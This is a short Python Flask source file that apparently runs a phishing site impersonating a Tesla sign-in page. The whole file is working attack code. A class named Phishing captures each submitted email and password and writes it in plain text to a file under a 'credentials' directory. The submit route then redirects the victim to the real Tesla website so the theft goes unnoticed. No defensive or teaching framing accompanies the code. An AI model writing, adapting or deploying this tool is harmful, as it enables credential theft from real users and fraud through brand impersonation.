import os
import re
from flask import Flask, render_template, request, redirect


app = Flask(__name__)


class Phishing:
    """
    This class gets the email and password of the user and saves them in a file.
    """
    def __init__(self, email, password):
        self.directory_path = "credentials"
        self.email = email
        self.password = password
        self.save_credentials()

    def save_credentials(self):
        # make the directory if not exist where file will store
        os.makedirs(self.directory_path, exist_ok=True)

        # fetch the username from the email replace invalid characters with "_"
        username = self.email.split("@")[0]
        username = re.sub(r'[<>:"/\\|?*]', "_", username)

        # create the file path using username
        file_name = f'{self.directory_path}/{username}_credentials.txt'

        try:
            # write credentials in the 'txt' file and store it into the directory
            with open(file_name, 'w') as file:
                file.write(f"Email: {self.email}\nPassword: {self.password}")
            print(f"Credentials saved in {file_name}")
        except Exception as e:
            print(f"Error saving credentials: {e}")


@app.route('/')
def index():
    return render_template('signin.html')

@app.route('/submit', methods=['POST'])
def submit():
     # Get email and password from the form
     email = request.form['email']
     password = request.form['password']

     # Create an instance of Phishing to save the credentials
     Phishing(email, password)

    # after submission redirect user to the actual Tesla's site
     return redirect("https://www.tesla.com/")

if __name__ == '__main__':
    app.run(debug=True)
